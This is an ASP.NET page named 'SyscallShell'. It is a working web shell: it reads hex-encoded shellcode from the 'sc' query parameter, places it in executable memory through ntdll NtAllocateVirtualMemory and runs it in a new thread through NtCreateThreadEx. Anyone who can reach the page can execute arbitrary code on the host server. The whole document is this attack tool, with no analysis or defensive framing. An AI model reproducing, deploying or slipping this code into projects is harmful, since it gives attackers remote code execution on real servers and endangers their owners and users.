<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    [DllImport("ntdll.dll")]
    static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
                                               ref IntPtr RegionSize, uint AllocationType, uint Protect);
    [DllImport("ntdll.dll")]
    static extern int NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes,
                                        IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter,
                                        bool CreateSuspended, int StackZeroBits, int SizeOfStackCommit,
                                        int SizeOfStackReserve, IntPtr AttributeList);
    protected void Page_Load(object sender, EventArgs e)
    {
        string shellcodeHex = Request.QueryString["sc"];
        if (!string.IsNullOrEmpty(shellcodeHex))
        {
            byte[] shellcode = new byte[shellcodeHex.Length / 2];
            for (int i = 0; i < shellcode.Length; i++)
                shellcode[i] = Convert.ToByte(shellcodeHex.Substring(i * 2, 2), 16);
            IntPtr addr = IntPtr.Zero;
            IntPtr size = (IntPtr)shellcode.Length;
            NtAllocateVirtualMemory(Process.GetCurrentProcess().Handle, ref addr, IntPtr.Zero, ref size, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
            IntPtr hThread;
            NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, Process.GetCurrentProcess().Handle, addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Response.Write("Syscall shellcode executed.");
        }
    }
</script>
<html><body><h2>SyscallShell</h2><form>shellcode (hex): <input type="text" name="sc" size=80 /></form></body></html>
